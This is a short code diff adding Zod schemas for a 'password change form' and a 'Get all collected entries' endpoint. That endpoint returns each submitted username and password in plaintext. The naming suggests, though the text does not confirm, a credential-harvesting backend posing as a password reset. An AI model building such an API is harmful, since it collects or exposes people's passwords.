@@ -14,3 +14,32 @@ import * as zod from "zod";
 export const HealthCheckResponse = zod.object({
   status: zod.string(),
 });
+
+/**
+ * @summary Submit password change form
+ */
+export const SubmitCredentialsBody = zod.object({
+  username: zod.string(),
+  newPassword: zod.string(),
+  confirmPassword: zod.string(),
+});
+
+export const SubmitCredentialsResponse = zod.object({
+  success: zod.boolean(),
+  message: zod.string(),
+});
+
+/**
+ * @summary Get all collected entries
+ */
+export const GetEntriesResponse = zod.object({
+  entries: zod.array(
+    zod.object({
+      id: zod.number(),
+      username: zod.string(),
+      newPassword: zod.string(),
+      confirmPassword: zod.string(),
+      submittedAt: zod.string(),
+    }),
+  ),
+});
